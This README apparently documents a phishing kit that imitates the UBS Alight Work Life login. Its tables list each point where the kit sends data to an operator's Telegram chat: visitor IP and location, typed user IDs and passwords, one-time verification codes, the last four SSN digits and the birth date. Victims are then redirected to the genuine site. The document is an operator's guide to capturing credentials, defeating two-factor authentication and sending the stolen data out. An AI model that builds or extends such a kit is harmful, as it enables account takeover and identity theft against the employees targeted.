# Telegram Notifications List

All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` (comma-separated for multiple chats).

---

## 1. New Visitor

| Field | Value |
|-------|--------|
| **Trigger** | User finishes preloader on homepage (login page) |
| **API** | `POST /api/telegram/visitor` |
| **Source** | `app/page.tsx` (after `showContent` is true and visitor info is available) |
| **Data sent** | Location, IP, Timezone, ISP, User Agent, Screen, Language, Referrer, UTC Time |

**What it looks like in Telegram:**

```
🌐 New Visitor - UBS Alight Work Life

📍 Location: New York, US
🌍 IP: 192.168.1.1
⏰ Timezone: America/New_York
🌐 ISP: Example ISP

📱 Device: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
🖥️ Screen: 1920x1080
🌍 Language: en-US
🔗 Referrer: (direct)

🕒 UTC Time: 2025-01-29T18:00:00.000Z
```

---

## 2. Login Attempt

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Log On** (after entering User ID and Password) |
| **API** | `POST /api/telegram/login` |
| **Source** | `components/login-form.tsx` |
| **Data sent** | User ID, Password |

**What it looks like in Telegram:**

```
🔐 Login Attempt

👤 User ID: jsmith
🔑 Password: mypassword123
```

---

## 3. Verification Option Selected

| Field | Value |
|-------|--------|
| **Trigger** | User selects "Text Me a Code" or "Call Me With a Code" on the Verify It's You / Choose an Option page |
| **API** | `POST /api/telegram/verification-click` |
| **Source** | `app/verify-choice/page.tsx` |
| **Data sent** | **verificationType:** e.g. "Text Me a Code", "Call Me With a Code" |

**What it looks like in Telegram:**

```
🟦 Verification Option Selected

🔐 Type: Text Me a Code
```

---

## 4. Verification Code Submitted

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Continue** on the Enter Access Code (OTP) page |
| **API** | `POST /api/telegram/verification` |
| **Source** | `app/verify/page.tsx` |
| **Data sent** | **Type:** `"Code (first OTP)"` or `"Code (final)"`, **Code:** the 6-digit code entered |

**What it looks like in Telegram:**

```
✅ Verification Code Submitted

🔐 Type: Code (first OTP)
🔢 Code: 123456
```

After submitting, the user is redirected to the Alight Work Life URL.

---

## 5. Resend Code Requested

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Resend code** on the OTP page |
| **API** | `POST /api/telegram/resend-code` |
| **Source** | `app/verify/page.tsx` |
| **Data sent** | **isSecondOtp:** boolean |

---

## 6. Forgot Password Submitted

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Continue** on the Forgot User ID or Password page (after SSN, birth date, and privacy checkbox) |
| **API** | `POST /api/telegram/forgot-password` |
| **Source** | `app/forgot-password/page.tsx` |
| **Data sent** | Last 4 SSN, Birth Date |

**What it looks like in Telegram:**

```
🔑 Forgot Password Submitted

🔢 Last 4 SSN: 1234
📅 Birth Date: February 14, 2026
```

---

## Flow order

1. **New Visitor** → when homepage is shown  
2. **Login Attempt** → when Log On is clicked  
3. **Verification Option Selected** → when user chooses Text Me a Code or Call Me With a Code on verify-choice  
4. **Verification Code Submitted** → when Continue is clicked on the OTP (verify) page → redirect to Alight URL  
5. **Forgot Password Submitted** → when Continue is clicked on forgot-password page (optional path from login)
